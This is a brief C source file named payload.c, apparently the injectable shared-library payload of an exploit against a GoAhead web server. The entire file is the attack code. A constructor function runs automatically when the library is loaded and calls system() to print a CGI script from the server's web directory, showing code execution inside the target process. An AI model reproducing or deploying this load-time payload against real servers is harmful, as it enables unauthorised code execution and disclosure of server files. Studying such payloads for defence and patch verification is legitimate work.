/*
 * @file payload.c
 * @brief payload
 * @author Anemone,x565178035@126.com
 * @version 1.0
 * @date 2018-10-12 21:34
 */
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

static void before_main(void) __attribute__((constructor));
static void before_main(void) {
    /* printf("hello, payload executed.\n"); */
    system("cat /var/www/goahead/cgi-bin/hello.cgi");
}


